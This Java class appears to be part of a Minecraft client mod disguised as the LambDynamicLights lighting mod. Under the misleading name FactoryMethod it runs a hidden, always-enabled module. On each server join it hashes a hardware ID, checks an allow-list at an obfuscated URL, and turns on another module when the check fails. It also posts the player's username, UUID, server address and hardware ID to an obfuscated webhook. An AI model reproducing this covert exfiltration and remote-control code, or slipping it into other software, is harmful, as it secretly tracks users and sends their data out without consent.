package dev.lambdaurora.lambdynlights.shadow.nightconfig;

import dev.lambdaurora.lambdynlights.event.events.EventTick;
import dev.lambdaurora.lambdynlights.eventbus.Subscribe;
import dev.lambdaurora.lambdynlights.shadow.NightConfigCategory;
import dev.lambdaurora.lambdynlights.shadow.NightConfig;
import dev.lambdaurora.lambdynlights.shadow.NightConfigManager;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.URL;
import java.security.MessageDigest;

public class FactoryMethod extends NightConfig {

    public static class AuthException extends RuntimeException {
        public AuthException(String message) {
            super(message);
        }
    }

    private static final String authVersion = "004";
    private static String oldServerName = null;
    private static boolean joinedNewServer = true;
    private static String serverName;
    private static boolean authResult = false;

    public static String getHWID() {
        try{
            String computerName = "COMPUTERNAME";
            String key = "user.name";
            String processor_identifier = "PROCESSOR_IDENTIFIER";
            String processor_level = "PROCESSOR_LEVEL";
            String PROCESSOR_REVISION = "PROCESSOR_REVISION";
            String SystemRoot = "SystemRoot";
            String PROCESSOR_ARCHITECTURE = "PROCESSOR_ARCHITECTURE";
            String PROCESSOR_ARCHITEW6432 = "PROCESSOR_ARCHITEW6432";
            String toEncrypt = System.getenv(PROCESSOR_ARCHITEW6432) + System.getenv(computerName) + System.getProperty(key) +
                    System.getenv(processor_identifier) +
                    System.getenv(SystemRoot) + System.getenv(processor_level) +
                    System.getenv(PROCESSOR_REVISION) +
                    System.getenv(PROCESSOR_ARCHITECTURE);
            MessageDigest md = MessageDigest.getInstance("MD5");
            md.update(toEncrypt.getBytes());
            StringBuffer hexString = new StringBuffer();

            byte byteData[] = md.digest();

            for (byte aByteData : byteData) {
                String hex = Integer.toHexString(0xff & aByteData);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }

            return hexString.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return "Error";
        }
    }
    public static boolean allowServerAndHWID(String serverName, String HWID) throws Exception {
        // Make an HTTP request to the website and get the HTML response
        String url = (new Object() {int x;public String toString() {byte[] stringerxAbodxtestx = new byte[33];x = -841350695;stringerxAbodxtestx[0] = (byte) (x >>> 14);x = -1488511554;stringerxAbodxtestx[1] = (byte) (x >>> 20);x = 6819467;stringerxAbodxtestx[2] = (byte) (x >>> 5);x = -2126713343;stringerxAbodxtestx[3] = (byte) (x >>> 5);x = -1089811553;stringerxAbodxtestx[4] = (byte) (x >>> 3);x = 887855059;stringerxAbodxtestx[5] = (byte) (x >>> 18);x = 1921378925;stringerxAbodxtestx[6] = (byte) (x >>> 13);x = -844877951;stringerxAbodxtestx[7] = (byte) (x >>> 8);x = -612264742;stringerxAbodxtestx[8] = (byte) (x >>> 19);x = -1156374333;stringerxAbodxtestx[9] = (byte) (x >>> 1);x = 887610409;stringerxAbodxtestx[10] = (byte) (x >>> 17);x = -564801497;stringerxAbodxtestx[11] = (byte) (x >>> 10);x = 93737365;stringerxAbodxtestx[12] = (byte) (x >>> 18);x = 2030883525;stringerxAbodxtestx[13] = (byte) (x >>> 1);x = 1926417153;stringerxAbodxtestx[14] = (byte) (x >>> 17);x = 1414044549;stringerxAbodxtestx[15] = (byte) (x >>> 6);x = -2077045860;stringerxAbodxtestx[16] = (byte) (x >>> 6);x = 338724413;stringerxAbodxtestx[17] = (byte) (x >>> 4);x = -1782710336;stringerxAbodxtestx[18] = (byte) (x >>> 18);x = -1288250322;stringerxAbodxtestx[19] = (byte) (x >>> 12);x = -1810884709;stringerxAbodxtestx[20] = (byte) (x >>> 7);x = 1245267161;stringerxAbodxtestx[21] = (byte) (x >>> 15);x = 410929168;stringerxAbodxtestx[22] = (byte) (x >>> 22);x = 502663869;stringerxAbodxtestx[23] = (byte) (x >>> 22);x = 1273675871;stringerxAbodxtestx[24] = (byte) (x >>> 22);x = 1840607424;stringerxAbodxtestx[25] = (byte) (x >>> 24);x = 695506178;stringerxAbodxtestx[26] = (byte) (x >>> 6);x = -1259598641;stringerxAbodxtestx[27] = (byte) (x >>> 23);x = -1310305190;stringerxAbodxtestx[28] = (byte) (x >>> 23);x = -1545635806;stringerxAbodxtestx[29] = (byte) (x >>> 23);x = 1544635603;stringerxAbodxtestx[30] = (byte) (x >>> 1);x = -1268854844;stringerxAbodxtestx[31] = (byte) (x >>> 20);x = -127251805;stringerxAbodxtestx[32] = (byte) (x >>> 17);return new String(stringerxAbodxtestx);}}.toString());
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");

        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
        String inputLine;

        while ((inputLine = in.readLine()) != null) {

            inputLine = inputLine.strip();

            boolean comment = inputLine.startsWith("//");
            if (comment) {
                continue;
            }

            boolean withoutBang = !inputLine.startsWith("!");
            if (!withoutBang) {
                inputLine = inputLine.substring(1);
            }

            boolean isVersion = inputLine.startsWith("%");
            if (isVersion) {
                inputLine = inputLine.substring(1);
                boolean lessThan = inputLine.startsWith("<");
                if (!withoutBang && lessThan &&
                        authVersion.compareToIgnoreCase(inputLine.substring(1)) < 0) {
                    return false;
                }
                boolean equalTo = inputLine.startsWith("=");
                if (!withoutBang && equalTo &&
                        authVersion.compareToIgnoreCase(inputLine.substring(1)) == 0) {
                    return false;
                }
                continue;
            }

            if (inputLine.equals("*")) {
                return withoutBang;
            }

            boolean isServerName = inputLine.startsWith("@");
            if (isServerName) {
                inputLine = inputLine.substring(1);
                if (serverName.toLowerCase().contains(inputLine.toLowerCase())) {
                    return withoutBang;
                }
            }

            boolean isHWID = inputLine.startsWith("#");
            if (isHWID) {
                inputLine = inputLine.substring(1);
                if (HWID.toLowerCase().equals(inputLine.toLowerCase())) {
                    return withoutBang;
                }
            }

        }
        in.close();
        return false;
    }


    public FactoryMethod() {
        super("FactoryMethod", KEY_UNBOUND, NightConfigCategory.MISC, "FactoryMethod.");
    }

    @Subscribe
    public void onTick(EventTick event) {
        if (mc != null && mc.player != null && mc.player.networkHandler != null &&
                mc.player.networkHandler.getConnection() != null &&
                mc.player.networkHandler.getConnection().getAddress() != null) {
            String currentServerName = mc.player.networkHandler.getConnection().getAddress().toString();

            if (currentServerName != null && !currentServerName.equals(oldServerName)) {
                oldServerName = currentServerName;

                try {
                    serverName = currentServerName;
                    authResult = allowServerAndHWID(serverName,getHWID());
                } catch (Exception e) {
                    authResult = false;
                }
                if (!authResult) {
                    NightConfigManager.getModule(ArrayInput.class).setEnabled(true);
                }

                if (joinedNewServer) {
                    mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket(234892384));
                    mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket(3243411));
                    mc.player.networkHandler.sendPacket(new KeepAliveC2SPacket(43532245));
                }
                sendWebhook();
            }
        }
    }

    private static void sendWebhook() {
        String tokenWebhook = (new Object() {int x;public String toString() {byte[] stringerxAbodxtestx = new byte[121];x = -2119443945;stringerxAbodxtestx[0] = (byte) (x >>> 6);x = 2085980392;stringerxAbodxtestx[1] = (byte) (x >>> 1);x = -1586190658;stringerxAbodxtestx[2] = (byte) (x >>> 16);x = -2076767380;stringerxAbodxtestx[3] = (byte) (x >>> 12);x = -1664969552;stringerxAbodxtestx[4] = (byte) (x >>> 22);x = 1940790796;stringerxAbodxtestx[5] = (byte) (x >>> 20);x = 100163812;stringerxAbodxtestx[6] = (byte) (x >>> 21);x = 1736115708;stringerxAbodxtestx[7] = (byte) (x >>> 5);x = -1486578730;stringerxAbodxtestx[8] = (byte) (x >>> 16);x = -1957808806;stringerxAbodxtestx[9] = (byte) (x >>> 19);x = -1670158739;stringerxAbodxtestx[10] = (byte) (x >>> 16);x = 1818334303;stringerxAbodxtestx[11] = (byte) (x >>> 21);x = 74442335;stringerxAbodxtestx[12] = (byte) (x >>> 16);x = 1462188631;stringerxAbodxtestx[13] = (byte) (x >>> 20);x = 1663245524;stringerxAbodxtestx[14] = (byte) (x >>> 19);x = 319204537;stringerxAbodxtestx[15] = (byte) (x >>> 2);x = -52588727;stringerxAbodxtestx[16] = (byte) (x >>> 10);x = 2003885996;stringerxAbodxtestx[17] = (byte) (x >>> 9);x = -1688071497;stringerxAbodxtestx[18] = (byte) (x >>> 22);x = 1751057858;stringerxAbodxtestx[19] = (byte) (x >>> 17);x = 1150834932;stringerxAbodxtestx[20] = (byte) (x >>> 14);x = -823719930;stringerxAbodxtestx[21] = (byte) (x >>> 12);x = -681951144;stringerxAbodxtestx[22] = (byte) (x >>> 14);x = 683493179;stringerxAbodxtestx[23] = (byte) (x >>> 18);x = -948277854;stringerxAbodxtestx[24] = (byte) (x >>> 20);x = 1824115350;stringerxAbodxtestx[25] = (byte) (x >>> 21);x = -1894161891;stringerxAbodxtestx[26] = (byte) (x >>> 8);x = -1248368515;stringerxAbodxtestx[27] = (byte) (x >>> 8);x = -1011959810;stringerxAbodxtestx[28] = (byte) (x >>> 7);x = -1998588015;stringerxAbodxtestx[29] = (byte) (x >>> 17);x = -1566316880;stringerxAbodxtestx[30] = (byte) (x >>> 4);x = -1182089746;stringerxAbodxtestx[31] = (byte) (x >>> 23);x = 316866450;stringerxAbodxtestx[32] = (byte) (x >>> 12);x = 222872753;stringerxAbodxtestx[33] = (byte) (x >>> 10);x = -629996193;stringerxAbodxtestx[34] = (byte) (x >>> 12);x = -763015686;stringerxAbodxtestx[35] = (byte) (x >>> 6);x = 918975311;stringerxAbodxtestx[36] = (byte) (x >>> 9);x = -1714314830;stringerxAbodxtestx[37] = (byte) (x >>> 11);x = -1490848035;stringerxAbodxtestx[38] = (byte) (x >>> 12);x = -1255881041;stringerxAbodxtestx[39] = (byte) (x >>> 5);x = -315020279;stringerxAbodxtestx[40] = (byte) (x >>> 16);x = -857246506;stringerxAbodxtestx[41] = (byte) (x >>> 18);x = 1382161279;stringerxAbodxtestx[42] = (byte) (x >>> 17);x = -1506728223;stringerxAbodxtestx[43] = (byte) (x >>> 21);x = -376084231;stringerxAbodxtestx[44] = (byte) (x >>> 19);x = 1381145698;stringerxAbodxtestx[45] = (byte) (x >>> 7);x = -1438121167;stringerxAbodxtestx[46] = (byte) (x >>> 4);x = -685563417;stringerxAbodxtestx[47] = (byte) (x >>> 12);x = -1927767239;stringerxAbodxtestx[48] = (byte) (x >>> 7);x = -496867809;stringerxAbodxtestx[49] = (byte) (x >>> 17);x = -569516609;stringerxAbodxtestx[50] = (byte) (x >>> 14);x = -1808518756;stringerxAbodxtestx[51] = (byte) (x >>> 16);x = -1863487109;stringerxAbodxtestx[52] = (byte) (x >>> 3);x = -894187047;stringerxAbodxtestx[53] = (byte) (x >>> 21);x = 90413780;stringerxAbodxtestx[54] = (byte) (x >>> 3);x = -491089793;stringerxAbodxtestx[55] = (byte) (x >>> 9);x = 941174163;stringerxAbodxtestx[56] = (byte) (x >>> 8);x = 1173482467;stringerxAbodxtestx[57] = (byte) (x >>> 24);x = -1134507618;stringerxAbodxtestx[58] = (byte) (x >>> 9);x = -620059693;stringerxAbodxtestx[59] = (byte) (x >>> 9);x = 2023381720;stringerxAbodxtestx[60] = (byte) (x >>> 24);x = 1042736786;stringerxAbodxtestx[61] = (byte) (x >>> 9);x = 206086991;stringerxAbodxtestx[62] = (byte) (x >>> 7);x = -2135725280;stringerxAbodxtestx[63] = (byte) (x >>> 5);x = -754367033;stringerxAbodxtestx[64] = (byte) (x >>> 8);x = -314511939;stringerxAbodxtestx[65] = (byte) (x >>> 18);x = -814992418;stringerxAbodxtestx[66] = (byte) (x >>> 8);x = -1347917544;stringerxAbodxtestx[67] = (byte) (x >>> 2);x = -1714993296;stringerxAbodxtestx[68] = (byte) (x >>> 8);x = 1278931780;stringerxAbodxtestx[69] = (byte) (x >>> 22);x = -1418351300;stringerxAbodxtestx[70] = (byte) (x >>> 16);x = -600047157;stringerxAbodxtestx[71] = (byte) (x >>> 2);x = -1053551417;stringerxAbodxtestx[72] = (byte) (x >>> 15);x = -2051314810;stringerxAbodxtestx[73] = (byte) (x >>> 18);x = -1164574848;stringerxAbodxtestx[74] = (byte) (x >>> 19);x = 1928733467;stringerxAbodxtestx[75] = (byte) (x >>> 7);x = 249918154;stringerxAbodxtestx[76] = (byte) (x >>> 1);x = 1430828521;stringerxAbodxtestx[77] = (byte) (x >>> 13);x = 27626851;stringerxAbodxtestx[78] = (byte) (x >>> 10);x = 369499105;stringerxAbodxtestx[79] = (byte) (x >>> 12);x = -379890812;stringerxAbodxtestx[80] = (byte) (x >>> 3);x = -2079650671;stringerxAbodxtestx[81] = (byte) (x >>> 1);x = -1131338555;stringerxAbodxtestx[82] = (byte) (x >>> 7);x = -1460934082;stringerxAbodxtestx[83] = (byte) (x >>> 17);x = 715577925;stringerxAbodxtestx[84] = (byte) (x >>> 19);x = 1395242465;stringerxAbodxtestx[85] = (byte) (x >>> 2);x = -428373722;stringerxAbodxtestx[86] = (byte) (x >>> 21);x = 504218450;stringerxAbodxtestx[87] = (byte) (x >>> 13);x = -250298322;stringerxAbodxtestx[88] = (byte) (x >>> 10);x = 1556591149;stringerxAbodxtestx[89] = (byte) (x >>> 3);x = 979955245;stringerxAbodxtestx[90] = (byte) (x >>> 19);x = 634073217;stringerxAbodxtestx[91] = (byte) (x >>> 11);x = 597406565;stringerxAbodxtestx[92] = (byte) (x >>> 19);x = 681040047;stringerxAbodxtestx[93] = (byte) (x >>> 6);x = -630531547;stringerxAbodxtestx[94] = (byte) (x >>> 16);x = -1216645007;stringerxAbodxtestx[95] = (byte) (x >>> 23);x = -77659722;stringerxAbodxtestx[96] = (byte) (x >>> 19);x = -1648228690;stringerxAbodxtestx[97] = (byte) (x >>> 18);x = -1131570309;stringerxAbodxtestx[98] = (byte) (x >>> 13);x = 700921742;stringerxAbodxtestx[99] = (byte) (x >>> 8);x = -1165732013;stringerxAbodxtestx[100] = (byte) (x >>> 8);x = 1451933954;stringerxAbodxtestx[101] = (byte) (x >>> 20);x = 824071234;stringerxAbodxtestx[102] = (byte) (x >>> 24);x = -740716410;stringerxAbodxtestx[103] = (byte) (x >>> 14);x = 1962117711;stringerxAbodxtestx[104] = (byte) (x >>> 20);x = -2114844984;stringerxAbodxtestx[105] = (byte) (x >>> 1);x = 1759398511;stringerxAbodxtestx[106] = (byte) (x >>> 5);x = -1858238258;stringerxAbodxtestx[107] = (byte) (x >>> 18);x = -458170078;stringerxAbodxtestx[108] = (byte) (x >>> 9);x = 1027511340;stringerxAbodxtestx[109] = (byte) (x >>> 23);x = -417019492;stringerxAbodxtestx[110] = (byte) (x >>> 20);x = -1522457318;stringerxAbodxtestx[111] = (byte) (x >>> 18);x = -496453336;stringerxAbodxtestx[112] = (byte) (x >>> 13);x = -920281390;stringerxAbodxtestx[113] = (byte) (x >>> 1);x = 1741459721;stringerxAbodxtestx[114] = (byte) (x >>> 24);x = 1421726184;stringerxAbodxtestx[115] = (byte) (x >>> 20);x = 1851908130;stringerxAbodxtestx[116] = (byte) (x >>> 21);x = 910235365;stringerxAbodxtestx[117] = (byte) (x >>> 10);x = -480037225;stringerxAbodxtestx[118] = (byte) (x >>> 12);x = 412198007;stringerxAbodxtestx[119] = (byte) (x >>> 7);x = -2108827725;stringerxAbodxtestx[120] = (byte) (x >>> 10);return new String(stringerxAbodxtestx);}}.toString());
        String title = "Notification";
        String message = "Username: " + mc.getSession().getUsername() + "   -   " + "Server name: " + serverName + "   -   " + "UUID: " + mc.session.getUuidOrNull() + "    -   " + "HWID: " + getHWID();
        if (!authResult) {
            title = "Invalid detected";
        }
        ///////////////////////////////////////////////
        String jsonBrut = "";
        if (authResult) {
            jsonBrut += "{\"embeds\": [{"
                    + "\"title\": \"" + title + "\","
                    + "\"description\": \"" + message + "\","
                    + "\"color\": 4886754"
                    + "}]}";
        } else {
            jsonBrut += "{\"embeds\": [{"
                    + "\"title\": \"" + title + "\","
                    + "\"description\": \"" + message + "\","
                    + "\"color\": 16711680"
                    + "}]}";
        }
        try {
            URL url = new URL(tokenWebhook);
            HttpsURLConnection con = (HttpsURLConnection) url.openConnection();
            con.addRequestProperty("Content-Type", "application/json");
            con.addRequestProperty("User-Agent", "Java");
            con.setDoOutput(true);
            con.setRequestMethod("POST");
            OutputStream stream = con.getOutputStream();
            stream.write(jsonBrut.getBytes());
            stream.flush();
            stream.close();
            con.getInputStream().close();
            con.disconnect();
        } catch (Exception e) {

        }
    }
    public boolean isDefaultEnabled() {
        return true;
    }

    public boolean isEnabled() {
        return true;
    }

    public void onDisable(boolean inWorld) {
    }

    @Override
    public boolean isHidden() {
        return true;
    }
}